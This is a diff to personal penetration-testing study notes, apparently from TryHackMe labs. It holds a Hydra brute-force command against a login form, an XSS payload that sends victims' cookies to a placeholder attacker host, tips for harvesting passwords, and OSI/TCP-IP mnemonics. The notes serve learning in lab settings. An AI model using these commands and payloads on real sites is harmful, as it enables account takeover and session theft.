@@ -67,6 +67,9 @@ if( url.substr(0,6) === '/admin') {
 } else {
     # View Page
 }
+- Hydra hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+
+
 Example for PHP:
 user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
 We use the -H flag to add an additional header to the request. In this instance, we are setting the Content-Type to application/x-www-form-urlencoded, which lets the web server know we are sending form data so it properly understands our request.
@@ -262,6 +265,85 @@ document.cookie accesses the victim’s cookies for the Acme IT Support Website.
 </textarea><script>fetch('http://PORT_NUMBER:URL_OR_IP?cookie=' + btoa(document.cookie) );</script>
 5. Decode the cookia via base64 decoder
 
+Web DOM:
+one of the first things you should do is review the page source code to see if you can find any exposed login credentials or hidden links
+
+Networking:
+🎯 Easy Memory Trick:
+All People Seem To Need Data Processing
+(First letter = layer from top to bottom)
+🧠 The 7 Layers (Top → Bottom)
+7️⃣ Application
+What the user interacts with
+Examples: HTTP, FTP, SMTP
+Web browsers live here
+6️⃣ Presentation
+Formats data
+Encryption / Decryption
+Compression
+👉 Makes data readable.
+5️⃣ Session
+Starts and ends connections
+Manages sessions between devices
+4️⃣ Transport
+End-to-end communication
+Uses TCP or UDP
+Handles ports
+Breaks data into segments
+👉 Reliable or fast delivery.
+3️⃣ Network
+Handles IP addresses
+Routing between networks
+Uses routers
+2️⃣ Data Link
+Uses MAC addresses
+Works with switches
+Frames data
+1️⃣ Physical
+Cables, signals, electricity
+Bits (0s and 1s)
+📦 The 4 Layers of the TCP/IP Model
+This is the practical model used in real networks.
+🎯 Memory Trick:
+Application
+Transport
+Internet
+Network
+(ATIN — short and easy)
+🧠 The 4 Layers (Top → Bottom)
+4️⃣ Application
+Combines OSI layers 7, 6, 5
+HTTP, FTP, DNS, SMTP
+3️⃣ Transport
+TCP / UDP
+Ports
+Reliable delivery
+2️⃣ Internet
+IP addressing
+Routing
+Same as OSI Layer 3
+1️⃣ Network Access
+MAC addresses
+Physical hardware
+Same as OSI Layers 1 & 2 combined
+🔥 Super Simple Comparison
+OSI (7)	TCP/IP (4)
+7 Application	Application
+6 Presentation	Application
+5 Session	Application
+4 Transport	Transport
+3 Network	Internet
+2 Data Link	Network Access
+1 Physical	Network Access
+
+Use case:
+1. While walking around look for the paper notes, sticky notes or other details htat can be a password
+2. Use list of commonly used password from the National Security Center
+3. Use the history to look for misspeled command that can be a password
+4. Use whoami to verify the obtained identity
+
+
+   
 
 - HackTheBox Machines
 - PortSwigger Labs
